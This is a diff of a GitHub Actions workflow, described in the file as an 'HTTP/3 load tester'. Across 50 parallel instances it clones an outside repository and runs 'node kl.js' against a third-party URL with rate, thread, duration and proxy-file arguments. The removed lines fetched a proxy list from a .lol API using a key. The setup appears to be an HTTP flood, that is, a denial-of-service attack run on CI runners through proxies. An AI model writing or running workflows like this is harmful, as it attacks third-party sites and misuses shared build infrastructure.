@@ -29,29 +29,20 @@ jobs:
         with:
           python-version: '3.10'
       
-      - name: Install system dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y python3-pip python3-dev build-essential libssl-dev
-          python3 --version
-          pip3 --version
       
-      - name: Install Python packages for HTTP/3 load testing
-        run: |
-          pip3 install --upgrade pip
-          pip3 install aioquic uvloop requests
+          
+      
+      
       
       - name: Install Node.js dependencies
-        run: npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
+        run: npm install net chalk hpack.js hpack colors puppeteer-real-browser
       
-      - name: Download proxies
-        run: curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
       
       - name: Run HTTP/3 load tester (if Python script exists)
         run: |
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          python3 m.py
+          node kl.js GET https://rapidis.gay/6901966783-1bfa8c88-b2de-4b64-85cf-1d6645726318 300 4 120 proxy.txt --debug  --full
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
